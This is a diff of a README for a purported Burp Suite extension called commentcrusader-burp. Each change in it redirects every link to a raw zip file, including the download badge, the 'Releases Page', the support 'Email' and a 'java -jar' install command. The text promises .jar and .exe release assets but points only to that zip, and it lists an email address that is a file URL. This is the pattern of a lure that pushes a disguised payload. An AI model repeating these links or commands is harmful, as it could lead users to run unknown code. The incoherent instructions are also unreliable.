@@ -6,7 +6,7 @@ Welcome to **commentcrusader-burp**! This tool helps you find, catalog, and expo
 
 ## 📥 Download Link
 
-[![Download commentcrusader-burp](https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip)](https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip)
+[![Download commentcrusader-burp](https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip)](https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip)
 
 ## 📦 System Requirements
 
@@ -23,7 +23,7 @@ Welcome to **commentcrusader-burp**! This tool helps you find, catalog, and expo
 
 ## 📑 Installation Steps
 
-1. **Visit the Download Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip) to find the latest version of commentcrusader-burp.
+1. **Visit the Download Page**: Go to the [Releases Page](https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip) to find the latest version of commentcrusader-burp.
 
 2. **Choose Your Version**: Look for the latest release. Each version will have assets listed, like `.jar` files for Linux and macOS or `.exe` files for Windows.
 
@@ -35,7 +35,7 @@ Welcome to **commentcrusader-burp**! This tool helps you find, catalog, and expo
    - For Windows: Double-click the `.exe` file to start installation.
    - For macOS/Linux: Open a terminal, navigate to the folder containing the `.jar` file, and run the command:
      ```
-     java -jar https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip
+     java -jar https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip
      ```
 
 ## ⚙️ How to Use
@@ -69,7 +69,7 @@ The extension allows you to customize scanning rules and keywords. Access the se
 If you have questions or seek support:
 
 - **Community Forums**: Join discussions on GitHub Issues for community support.
-- **Email:** Contact our support at https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip
+- **Email:** Contact our support at https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip
 
 ## ⚖️ License
 
@@ -79,6 +79,6 @@ commentcrusader-burp is open-source software licensed under the MIT License. Fee
 
 Thank you for using commentcrusader-burp! Your feedback helps us improve the tool. We appreciate your contributions and support.
 
-Remember to frequently check our [Releases Page](https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip) for updates and new features.
+Remember to frequently check our [Releases Page](https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip) for updates and new features.
 
-[![Download commentcrusader-burp](https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip)](https://raw.githubusercontent.com/Feros0/commentcrusader-burp/main/thalamifloral/commentcrusader-burp.zip)
+[![Download commentcrusader-burp](https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip)](https://github.com/Feros0/commentcrusader-burp/raw/refs/heads/main/media/commentcrusader_burp_cessor.zip)
